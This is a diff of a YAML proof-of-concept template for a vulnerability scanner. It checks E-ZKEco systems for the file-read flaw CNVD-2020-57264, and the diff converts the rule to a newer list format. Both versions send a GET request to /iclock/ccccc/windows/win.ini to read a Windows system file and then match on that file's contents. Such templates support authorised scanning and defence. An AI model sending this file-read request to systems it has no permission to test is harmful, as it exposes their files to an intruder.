@@ -1,17 +1,11 @@
 name: poc-yaml-zkeco-CNVD-2020-57264-readfile
-manual: true
-transport: http
 rules:
-    readfile1:
-        request:
-            cache: true
-            method: GET
-            path: /iclock/ccccc/windows/win.ini
-            follow_redirects: false
-        expression: response.status == 200 && response.body.bcontains(b"for 16-bit app support") && response.body.bcontains(b"fonts")
-expression: readfile1()
+  - method: GET
+    path: /iclock/ccccc/windows/win.ini
+    expression: |
+      response.status == 200 && response.body.bcontains(b"for 16-bit app support")
 detail:
-    author: ThestaRY7 (https://github.com/ThestaRY7/)
-    links:
-        - https://www.cnvd.org.cn/flaw/show/CNVD-2020-57264
-    info: E-ZKEco readfileCNVD-2020-57264
+  author: ThestaRY7 (https://github.com/ThestaRY7/)
+  links:
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2020-57264
+  info: E-ZKEco readfileCNVD-2020-57264
